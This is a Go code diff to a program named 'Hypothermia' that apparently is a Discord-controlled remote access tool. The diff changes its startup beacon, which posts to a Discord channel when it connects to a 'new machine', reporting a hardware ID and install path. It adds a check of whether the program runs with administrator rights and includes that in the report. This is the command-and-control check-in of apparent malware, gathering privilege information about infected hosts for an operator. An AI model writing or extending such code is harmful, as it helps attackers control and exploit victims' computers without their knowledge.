@@ -12,6 +12,7 @@ import (
 
 	"Hypothermia/config"
 	"Hypothermia/src/bot/commands"
+	"Hypothermia/src/utils"
 	"Hypothermia/src/utils/crypto"
 
 	"github.com/bwmarrin/discordgo"
@@ -86,10 +87,49 @@ func Init() {
 		}
 	}
 
+	var admin string
+	isAdmin, err := utils.IsAdmin()
+	if err != nil {
+		admin = "Could not get"
+	} else {
+		if isAdmin {
+			admin = "Admin"
+		} else {
+			admin = "User"
+		}
+	}
+
+	var msg string
 	if code == 1 {
-		dg.ChannelMessageSend(channel, fmt.Sprintf("@here\n\nHypotermia successfully connected to new machine.\nUUID: %s\nRunning in: %s\n", hwid, path))
+		msg = "Hypotermia successfully connected to new machine."
 	} else if code == 2 {
-		dg.ChannelMessageSend(channel, fmt.Sprintf("@here\n\nHypotermia successfully reconnected.\nUUID: %s\nRunning in: %s", hwid, path))
+		msg = "Hypotermia successfully reconnected."
+	}
+
+	if code == 1 {
+		dg.ChannelMessageSend(
+			channel,
+			fmt.Sprintf(
+				"@here\n\n"+
+					"%s\n"+
+					"UUID: %s\n"+
+					"Running in: %s\n"+
+					"Running as: %s\n",
+				msg, hwid, path, admin,
+			),
+		)
+	} else if code == 2 {
+		dg.ChannelMessageSend(
+			channel,
+			fmt.Sprintf(
+				"@here\n\n"+
+					"%s\n"+
+					"UUID: %s\n"+
+					"Running in: %s\n"+
+					"Running as: %s\n",
+				msg, hwid, path, admin,
+			),
+		)
 	}
 
 	select {}
